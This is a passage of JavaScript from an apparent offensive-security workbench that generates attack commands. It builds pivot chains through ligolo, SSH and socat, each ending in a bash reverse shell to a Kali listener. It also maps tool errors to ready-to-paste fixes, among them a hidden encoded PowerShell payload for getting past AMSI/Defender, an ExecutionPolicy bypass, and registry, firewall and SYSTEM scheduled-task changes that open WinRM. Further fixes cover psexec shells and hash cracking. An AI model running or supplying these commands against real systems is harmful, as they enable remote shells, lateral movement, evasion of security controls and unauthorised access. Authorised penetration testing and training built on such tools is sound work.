          { locus: 'kali$', title: 'Step 1: Add Reverse Listener in Active Ligolo Session', label: 'Step 1: In active ligolo session, add a reverse listener on Pivot Host', note: 'Forwards Pivot Host 0.0.0.0:' + rPort + ' to Kali 127.0.0.1:' + rPort + '.', cmd: 'listener_add --addr 0.0.0.0:' + rPort + ' --to 127.0.0.1:' + rPort + ' --tcp' },
          { locus: 'kali$', title: 'Step 2: Start Netcat Listener on Kali', label: 'Step 2: Start your Netcat listener on Kali', note: 'Catches the forwarded shell on Kali.', cmd: 'nc -lvnp ' + rPort },
          { locus: 'target$', title: 'Step 3: Execute Reverse Shell on Internal Host Pointing at Pivot IP', label: 'Step 3: Point internal target payload at Pivot Host Internal IP (' + pivIp + ':' + rPort + ')', note: 'Connects to Pivot Host ' + pivIp + ':' + rPort + ', which relays to Kali.', cmd: 'bash -i >& /dev/tcp/' + pivIp + '/' + rPort + ' 0>&1' },
        ];
      } else if (tool === 'ssh') {
        note = 'SSH remote port forward (-R) opens port ' + rPort + ' on the Pivot Host and forwards connections to Kali.';
        steps = [
          { locus: 'kali$', title: 'Step 1: Start Netcat Listener on Kali', label: 'Step 1: Start Netcat listener on Kali', note: 'Listens on Kali port ' + rPort + '.', cmd: 'nc -lvnp ' + rPort },
          { locus: 'kali$', title: 'Step 2: Bind Port ' + rPort + ' on Pivot Host via SSH -R', label: 'Step 2: Bind port ' + rPort + ' on Pivot Host via SSH -R', note: 'Forwards Pivot Host port ' + rPort + ' back to Kali.', cmd: 'ssh -N -o GatewayPorts=yes -R 0.0.0.0:' + rPort + ':127.0.0.1:' + rPort + ' ' + user + '@' + target },
          { locus: 'target$', title: 'Step 3: Trigger Reverse Shell on Internal Host to ' + pivIp + ':' + rPort, label: 'Step 3: Point internal target payload at ' + pivIp + ':' + rPort, note: 'Internal host connects to the Pivot Host internal IP.', cmd: 'bash -i >& /dev/tcp/' + pivIp + '/' + rPort + ' 0>&1' },
        ];
      } else {
        note = 'Forwards incoming connections on Pivot Host port ' + rPort + ' straight to Kali ' + lhost + ':' + rPort + ' using socat or Windows netsh.';
        steps = [
          { locus: 'kali$', title: 'Step 1: Start Netcat Listener on Kali', label: 'Step 1: Start Netcat listener on Kali', note: 'Listens on Kali ' + lhost + ':' + rPort + '.', cmd: 'nc -lvnp ' + rPort },
          { locus: 'target$', title: 'Step 2 (Linux Pivot): Relay Port ' + rPort + ' with socat', label: 'Step 2 (Linux Pivot): Relay port ' + rPort + ' with socat', note: 'Or on Windows Pivot (Admin): netsh interface portproxy add v4tov4 listenport=' + rPort + ' listenaddress=0.0.0.0 connectport=' + rPort + ' connectaddress=' + lhost, cmd: 'socat TCP-LISTEN:' + rPort + ',fork,reuseaddr TCP:' + lhost + ':' + rPort + ' &' },
          { locus: 'target$', title: 'Step 3: Trigger Reverse Shell on Internal Host to ' + pivIp + ':' + rPort, label: 'Step 3: Point internal target payload at ' + pivIp + ':' + rPort, note: 'Internal host connects to ' + pivIp + ':' + rPort + '.', cmd: 'bash -i >& /dev/tcp/' + pivIp + '/' + rPort + ' 0>&1' },
        ];
      }
    }
    return { scenario: scenario, tool: tool, summary: note, note: note, steps: steps };
  };

  // ── Upgraded Output & Error Doctor (Benign OS Baselines + Error Remediation) ─────────────────
  var STOCK_SUID_BINS = {
    'passwd': 1, 'su': 1, 'sudo': 1, 'mount': 1, 'umount': 1, 'chsh': 1, 'chfn': 1, 'newgrp': 1, 'gpasswd': 1,
    'fusermount': 1, 'fusermount3': 1, 'ping': 1, 'ping6': 1, 'traceroute6.iputils': 1, 'pppd': 1,
    'openssh-keysign': 1, 'ssh-keysign': 1, 'dbus-daemon-launch-helper': 1, 'eject': 1, 'dmcrypt-get-device': 1,
    'Xorg.wrap': 1, 'snap-confine': 1, 'polkit-agent-helper-1': 1, 'unix_chkpwd': 1, 'chage': 1, 'expiry': 1,
    'bsd-write': 1, 'wall': 1, 'write': 1, 'at': 1, 'crontab': 1, 'pam_timestamp_check': 1, 'pt_chown': 1
  };

  W.scanBenignBaselines = function (text, command) {
    var t = String(text == null ? '' : text);
    var cmd = String(command == null ? '' : command);
    if (!t.trim()) return [];
    var out = [];

    // 1. Linux SUID find output where every binary is a default stock OS binary
    var suidLines = t.split(/\r?\n/).map(function (l) { return l.trim(); }).filter(function (l) {
      return /^\/(?:usr\/|bin\/|sbin\/|lib\/|snap\/|opt\/)\S+$/.test(l);
    });
    if (suidLines.length >= 2 || (/find\b.*-perm/i.test(cmd) && suidLines.length >= 1)) {
      var stock = [], custom = [];
      suidLines.forEach(function (p) {
        var b = p.split('/').pop();
        if (STOCK_SUID_BINS[b]) stock.push(b);
        else custom.push(p);
      });
      if (stock.length && custom.length === 0) {
        var suidWhy = 'All ' + stock.length + ' SUID binaries (' + stock.slice(0, 8).join(', ') + (stock.length > 8 ? '...' : '') + ') are stock Linux system binaries with no standard GTFOBins SUID escape.';
        var suidFix = 'Cross SUID off your list. Pivot to sudo -l, file capabilities (getcap -r / 2>/dev/null), internal ports (ss -tlnp), or cron jobs (pspy64).';
        out.push({
          id: 'suid-stock',
          title: 'SUID Scan Complete: Only Standard OS Binaries Found (' + stock.length + ' ignored)',
          verdict: 'Dead End (Benign Baseline)',
          detail: suidWhy, why: suidWhy,
          next: suidFix, fix: suidFix
        });
      }
    }

    // 2. Windows whoami /priv with only standard low-privilege tokens
    if (/PRIVILEGES INFORMATION/i.test(t) || /\bSeChangeNotifyPrivilege\b/i.test(t)) {
      var hasHighWinPriv = /\b(SeImpersonatePrivilege|SeAssignPrimaryTokenPrivilege|SeBackupPrivilege|SeRestorePrivilege|SeDebugPrivilege|SeTakeOwnershipPrivilege|SeLoadDriverPrivilege|SeManageVolumePrivilege|SeCreateTokenPrivilege|SeTcbPrivilege|SeRelabelPrivilege)\b/i.test(t);
      if (!hasHighWinPriv) {
        var privWhy = 'Only default baseline privileges (such as SeChangeNotifyPrivilege or SeShutdownPrivilege) are present. SeImpersonatePrivilege and SeBackupPrivilege are absent.';
        var privFix = 'Token impersonation (GodPotato/PrintSpoofer) will not work under this account. Check group memberships (whoami /groups), stored credentials (cmdkey /list), unquoted/modifiable services, scheduled tasks, or PowerShell history.';
        out.push({
          id: 'whoami-priv-standard',
          title: 'Windows Token Privileges: Standard Low-Privilege Account',
          verdict: 'Dead End (No Potato / Token Escalation)',
          detail: privWhy, why: privWhy,
          next: privFix, fix: privFix
        });
      }
    }

    // 3. sudo -l explicit denial
    if (/Sorry,\s+user\s+\S+\s+may not run sudo|is not allowed to run sudo|is not in the sudoers file/i.test(t)) {
      var sudoWhy = 'The sudoers policy explicitly denies sudo execution for this user.';
      var sudoFix = 'Move on to SUID/SGID binaries, Linux capabilities (getcap -r / 2>/dev/null), writable cron scripts, internal localhost services (ss -tlnp), or credentials in web/app config files.';
      out.push({
        id: 'sudo-denied',
        title: 'Sudo Check Complete: Account Has Zero Sudo Rules',
        verdict: 'Dead End (No Sudo Rights)',
        detail: sudoWhy, why: sudoWhy,
        next: sudoFix, fix: sudoFix
      });
    }

    // 4. Default /etc/crontab with only standard run-parts maintenance jobs
    if (/\/etc\/cron\.(?:hourly|daily|weekly|monthly)/i.test(t)) {
      var cronCustom = t.split(/\r?\n/).filter(function (l) {
        var s = l.trim();
        if (!s || s[0] === '#' || /^(?:SHELL|PATH|MAILTO|HOME)=/i.test(s)) return false;
        if (/^[*0-9\/,-]+\s+[*0-9\/,-]+\s+[*0-9\/,-]+\s+[*0-9\/,-]+\s+[*0-9\/,-]+/.test(s)) {
          return !/run-parts\s+--report\s+\/etc\/cron\.(?:hourly|daily|weekly|monthly)|anacron|debian-sa1|e2scrub_all/i.test(s);
        }
        return false;
      });
      if (cronCustom.length === 0) {
        var cronWhy = 'Only standard Debian/Ubuntu run-parts schedules (cron.hourly, cron.daily, cron.weekly, cron.monthly) are present in /etc/crontab.';
        var cronFix = 'Check /etc/cron.d/, /var/spool/cron/crontabs/, and systemctl list-timers, or run pspy64 to spot root cron jobs hidden from low-privilege users.';
        out.push({
          id: 'crontab-default',
          title: 'System /etc/crontab: Only Default OS Maintenance Jobs Listed',
          verdict: 'Dead End in /etc/crontab',
          detail: cronWhy, why: cronWhy,
          next: cronFix, fix: cronFix
        });
      }
    }

    return out;
  };

  var DOCTOR_ERRORS = [
    { id: 'host-down', re: /Note:\s*Host seems down|0 hosts up|host (?:seems|appears) to be down/i,
      title: 'Nmap Blocked by ICMP Ping Filter (Host Seems Down)',
      why: 'The target firewall drops ICMP echo requests, so Nmap stops before scanning any TCP ports.',
      fix: 'Re-run Nmap with -Pn to skip ICMP host discovery.',
      fixTpl: 'nmap -Pn -p- --min-rate 3000 -T4 {{target}}' },
    { id: 'dns-fail', re: /Could not resolve host(?:name)?|Name or service not known|Temporary failure in name resolution|The DNS query name does not exist/i,
      title: 'Hostname Resolution Failed (/etc/hosts Missing Entry)',
      why: 'The target redirected to or requires a virtual hostname/FQDN that is not in your Kali /etc/hosts file.',
      fix: 'Append the target IP and hostname/domain to /etc/hosts on Kali.',
      fixTpl: "echo '{{target}} {{domain}}' | sudo tee -a /etc/hosts" },
    { id: 'krb-skew', re: /KRB_AP_ERR_SKEW|clock skew too great|time difference too large/i,
      title: 'Kerberos Clock Skew Rejected Ticket (>5 Minute Drift)',
      why: 'Active Directory rejects Kerberos tickets when your Kali clock differs from the Domain Controller by more than 5 minutes.',
      fix: 'Disable local NTP and sync your Kali clock directly against the Domain Controller.',
      fixTpl: 'sudo timedatectl set-ntp off && sudo rdate -n {{target}} || sudo ntpdate {{target}}' },
    { id: 'krb-spn-ip', re: /KDC_ERR_S_PRINCIPAL_UNKNOWN|Server not found in Kerberos database/i,
      title: 'Kerberos Principal Unknown (Used IP Instead of FQDN)',
      why: 'Kerberos SPNs are registered to the host FQDN (e.g. dc01.acme.internal), not its IP address.',
      fix: 'Run nxc smb to read the DC hostname + domain, add it to /etc/hosts, and pass the FQDN instead of the IP.',
      fixTpl: 'nxc smb {{target}}' },
    { id: 'crlf-bad-interp', re: /bad interpreter:\s*No such file or directory|\^M:\s*bad interpreter|\\r':\s*bad interpreter/i,
      title: 'Windows CRLF Line Endings Breaking Linux Script',
      why: 'The script was saved with Windows \\r\\n line endings, so Linux looks for /bin/bash\\r and fails.',
      fix: 'Strip carriage returns (\\r) in-place with sed or dos2unix.',
      fixTpl: "sed -i 's/\\r$//' script.sh && chmod +x script.sh" },
    { id: 'sudo-no-tty', re: /sudo:\s*(?:no tty present|a (?:terminal|password) is required)|must be run from a terminal/i,
      title: 'Interactive TTY Required for sudo / su',
      why: 'You are in a non-interactive web or reverse shell, and sudo/su refuses to read a password without a pseudo-terminal.',
      fix: 'Upgrade the shell to a Python PTY (or /usr/bin/script) before running sudo/su.',
      fixTpl: 'python3 -c \'import pty;pty.spawn("/bin/bash")\'' },
    { id: 'ssh-pubkey', re: /Permission denied \(publickey(?:,gssapi-keyex,gssapi-with-mic)?\)/i,
      title: 'SSH Refused Password Authentication (PublicKey Only)',
      why: 'sshd_config has PasswordAuthentication no. Password brute-forcing or spraying SSH on this host will never succeed.',
      fix: 'Stop password attempts on SSH; hunt for an id_rsa key via LFI, SMB/NFS shares, or web backups.',
      fixTpl: 'chmod 600 id_rsa && ssh -i id_rsa {{user}}@{{target}}' },
    { id: 'ssh-bad-perms', re: /UNPROTECTED PRIVATE KEY FILE|Permissions 0[0-7]{3} for .* are too open/i,
      title: 'SSH Private Key Permissions Too Open',
      why: 'OpenSSH refuses to use a private key if group/other users can read it.',
      fix: 'Restrict key permissions to owner read/write only (0600).',
      fixTpl: 'chmod 600 id_rsa && ssh -i id_rsa {{user}}@{{target}}' },
    { id: 'pw-must-change', re: /STATUS_PASSWORD_MUST_CHANGE|STATUS_PASSWORD_EXPIRED/i,
      title: 'Valid Credential, But Password Must Be Changed Before Use',
      why: 'The password is correct, but AD has "User must change password at next logon" set on the account.',
      fix: 'Reset the expired password remotely over SMB using NetExec change-password module or smbpasswd.',
      fixTpl: "nxc smb {{target}} -u {{user}} -p '{{password}}' -M change-password -o NEWPASS='NewPass2026!'" },
    { id: 'amsi-blocked', re: /This script contains malicious content and has been blocked|AMSI_RESULT_DETECTED|contains a virus or potentially unwanted software/i,
      title: 'Windows Defender / AMSI Blocked the Payload',
      why: 'AMSI or Defender signature-matched the script or binary on disk.',
      fix: 'Switch to an alternate binary (GodPotato / RunasCs) or encode the command in Workbench Codec.',
      fixTpl: 'powershell.exe -nop -w hidden -enc <BASE64_PAYLOAD>' },
    { id: 'ps-exec-policy', re: /cannot be loaded because running scripts is disabled on this system|PSSecurityException/i,
      title: 'PowerShell ExecutionPolicy Blocked Script Execution',
      why: 'The default Windows PowerShell ExecutionPolicy blocks .ps1 files unless bypassed via flags.',
      fix: 'Pass -ExecutionPolicy Bypass when invoking powershell.exe.',
      fixTpl: 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\\script.ps1' },
    { id: 'ldap-anon-disabled', re: /000004DC:\s*LdapErr:\s*DSID-0C09075A|In order to perform this operation a successful bind must be completed/i,
      title: 'Anonymous LDAP Bind Disabled by Domain Controller',
      why: 'Windows Server 2019/2022 disables unauthenticated LDAP queries by default (except RootDSE).',
      fix: 'Enumerate domain users via SMB null/guest RID cycling instead of anonymous LDAP.',
      fixTpl: "nxc smb {{target}} -u 'guest' -p '' --rid-brute" },
    { id: 'hashcat-token-exc', re: /Token length exception|No hashes loaded|Separator unmatched|Signature unmatched|Line-length exception/i,
      title: 'Hashcat Rejected the Hash Format',
      why: 'The hash file still has a username: prefix, wrapped lines, quotes, or the wrong -m mode.',
      fix: 'Paste the raw line into Workbench -> Hash ID to strip the prefix or add --username.',
      fixTpl: 'hashcat --username -m 1000 hash.txt /usr/share/wordlists/rockyou.txt' },
    { id: 'ffuf-wildcard', re: /the server returns a status code that matches the provided options for non existing urls|use the "--wildcard" switch/i,
      title: 'Web Fuzzer Hit Wildcard Catch-All Responses',
      why: 'The web server returns HTTP 200 (or same status) for every nonexistent URL, flooding the fuzzer.',
      fix: 'Re-run ffuf with -ac (auto-calibrate) or -fs <size> to filter wildcard responses.',
      fixTpl: 'ffuf -u http://{{target}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -ac' },
    { id: 'protected-users', re: /KDC_ERR_ETYPE_NOSUPP|KDC has no support for encryption type/i,
      title: 'Account in Protected Users Group (NTLM / RC4 Rejected)',
      why: 'Protected Users blocks NTLM pass-the-hash and RC4 tickets; only AES Kerberos authentication is allowed.',
      fix: 'Request a Kerberos TGT using the account AES256 key and authenticate with -k.',
      fixTpl: "impacket-getTGT '{{domain}}/{{user}}' -aesKey <AES256_KEY> && export KRB5CCNAME={{user}}.ccache" },
    { id: 'xfreerdp-tls', re: /BIO_do_handshake failed|ERRCONNECT_TLS_CONNECT_FAILED|freerdp_tls_handshake/i,
      title: 'FreeRDP TLS Handshake Rejected by Kali OpenSSL 3 (Legacy TLS 1.0 / SHA-1)',
      why: 'Windows Server 2008 R2 / 2012 / Windows 7 negotiates TLS 1.0 with a SHA-1 self-signed RDP certificate, which OpenSSL 3 rejects during BIO_do_handshake before /cert:ignore runs.',
      fix: 'Add /tls:seclevel:0 (and /sec:rdp if TLS is disabled after setting UserAuthentication=0) to xfreerdp.',
      fixTpl: "xfreerdp /v:{{target}} /d:'{{domain}}' /u:'{{user}}' /p:'{{password}}' /cert:ignore /tls:seclevel:0 +clipboard" },
    { id: 'winrm-wmi-quickconfig', re: /Set-WSManQuickConfig\s*:\s*Access is denied|WsManError,Microsoft\.WSMan\.Management\.SetWSManQuickConfigCommand/i,
      title: 'Set-WSManQuickConfig Blocked Over WMI Network Logon (Port 5985 Not Created)',
      why: 'WMI (nxc smb -x and impacket-wmiexec) uses a Logon Type 3 network token that WSMan rejects during Set-WSManQuickConfig, aborting before the HTTP 5985 listener is created.',
      fix: 'Enable the WinRM HTTP 5985 listener via Registry AllowAutoConfig + IPv4Filter + service restart and initialize PSRemoting via a SYSTEM scheduled task (or use impacket-psexec).',
      fixTpl: "nxc smb {{target}} -u '{{user}}' -p '{{password}}' -x '(reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service\" /v AllowAutoConfig /t REG_DWORD /d 1 /f & reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WinRM\\Service\" /v IPv4Filter /t REG_SZ /d \"*\" /f & reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f & netsh advfirewall firewall add rule name=WinRM dir=in action=allow protocol=TCP localport=5985 & sc config WinRM start= auto & net stop WinRM & net start WinRM & schtasks /create /tn WinRMInit /tr \"powershell.exe -NoProfile -Command Enable-PSRemoting -Force\" /sc ONSTART /ru SYSTEM /f & schtasks /run /tn WinRMInit & ping -n 5 127.0.0.1 >nul & schtasks /delete /tn WinRMInit /f)'" },
    { id: 'winrm-conn-refused', re: /Errno::ECONNREFUSED[^\r\n]*port 5985|Connection refused[^\r\n]*:5985\b/i,
      title: 'Evil-WinRM Connection Refused on Port 5985 (No HTTP Listener Bound)',
      why: 'TCP port 5985 passed the firewall and returned TCP RST because no WinRM HTTP listener is bound on the target (common on Server 2008 R2 or when Enable-PSRemoting failed over WMI).',
      fix: 'Use impacket-psexec for an immediate interactive SYSTEM shell over SMB 445, or enable the WinRM listener via Registry AllowAutoConfig + WinRM service restart.',
      fixTpl: "impacket-psexec '{{domain}}/{{user}}:{{password}}@{{target}}'" },
  ];

  W.diagnoseErrors = function (text, commandOrVals, valsArg) {
    var t = String(text == null ? '' : text);
    if (!t.trim()) return [];
    var vals = (commandOrVals && typeof commandOrVals === 'object') ? commandOrVals : (valsArg || {});
    var target = vals.target || '{{target}}';
    var domain = vals.domain || '{{domain}}';
    var user = vals.user || vals.username || '{{user}}';
    var pass = vals.password || '{{password}}';
    var lines = t.split(/\r?\n/);
    var out = [], seen = {};
    for (var i = 0; i < DOCTOR_ERRORS.length; i++) {
      var d = DOCTOR_ERRORS[i];
      if (!seen[d.id] && d.re.test(t)) {
        seen[d.id] = 1;
        var matchedLine = '';
        for (var j = 0; j < lines.length; j++) {
          if (d.re.test(lines[j])) { matchedLine = lines[j].trim(); break; }
        }
        var fixCmd = String(d.fixTpl || '')
          .replace(/\{\{target\}\}/g, target)
          .replace(/\{\{domain\}\}/g, domain)
          .replace(/\{\{user\}\}/g, user)
          .replace(/\{\{password\}\}/g, pass);
        out.push({ id: d.id, title: d.title, why: d.why, fix: d.fix, matchedLine: matchedLine, cmd: fixCmd, fixCmd: fixCmd });
      }
    }
    return out;
  };

  W.triageOutput = function (text, opts) {
    opts = opts || {};
    var command = opts.command || '';
    var vals = opts.params || opts;
    var errors = W.diagnoseErrors(text, command, vals);
    var baselines = W.scanBenignBaselines(text, command);
    var signals = W.scanSignals(text);
    var winSigs = signals.filter(function (s) { return s.tone === 'win'; });
    var verdict;
    if (errors.length) {
      verdict = {
        tone: 'warn',
        title: errors.length + ' Actionable Tool / Protocol Error' + (errors.length === 1 ? '' : 's') + ' Detected',
        summary: 'The command hit a fixable blocker (' + errors[0].title + '). Copy the remediation command below and re-run.'
      };
    } else if (winSigs.length) {
      verdict = {
        tone: 'win',
        title: winSigs.length + ' High-Value Security Lead' + (winSigs.length === 1 ? '' : 's') + ' Found',
        summary: 'Actionable attack path spotted: ' + winSigs[0].label + '. Follow the recommended next move below.'
      };
    } else if (baselines.length) {
      verdict = {
        tone: 'info',
        title: 'Benign OS Baseline Confirmed (' + baselines[0].verdict + ')',
        summary: baselines[0].why + ' ' + baselines[0].fix
      };
    } else if (signals.length) {
      verdict = {
        tone: 'info',
        title: signals.length + ' Notable Output Signal' + (signals.length === 1 ? '' : 's') + ' Spotted',
        summary: signals[0].label + ': ' + signals[0].meaning
      };
    } else {
      verdict = {
        tone: 'info',
        title: 'No Known Error Blockers or Stock Dead-Ends Matched',
        summary: 'Review any Minted Facts below or paste full raw command output (including headers and error lines) for deeper triage.'
      };
    }
    return { verdict: verdict, errors: errors, baselines: baselines, signals: signals };
  };

  // ── finding narratives (what the facts add up to) ────────────────────────────────────────────
  // Reuse the real findings engine (OBOL.findings.assess) + the technique narratives + the catalog so a
  // paste or a run turns into "here is what you found, why it matters, and what to do," not just a fact.
  W.findingNarratives = function (factset, opts) {
    opts = opts || {};
    if (!(OBOL.findings && OBOL.findings.assess)) return [];
    var matched;
    try { matched = OBOL.findings.assess(factset) || []; } catch (e) { return []; }
    var domain = opts.domain || '';
    function fill(s) { return String(s || '').replace(/\{\{domain\}\}/g, domain || 'the domain'); }
    return matched.map(function (m) {
      var narr = (OBOL.narratives || {})[m.key] || {};
      return {
        key: m.key, title: m.title || m.key, severity: String(m.severity || '').toLowerCase(), category: m.category || '',
        triggers: m.trigger_kinds || [],
        means: fill(narr.explanation || ''), impact: fill(narr.impact || ''), remediation: m.remediation || '',
      };
    });
  };

  OBOL.workbench = W;
})(typeof globalThis !== 'undefined' ? globalThis : this);
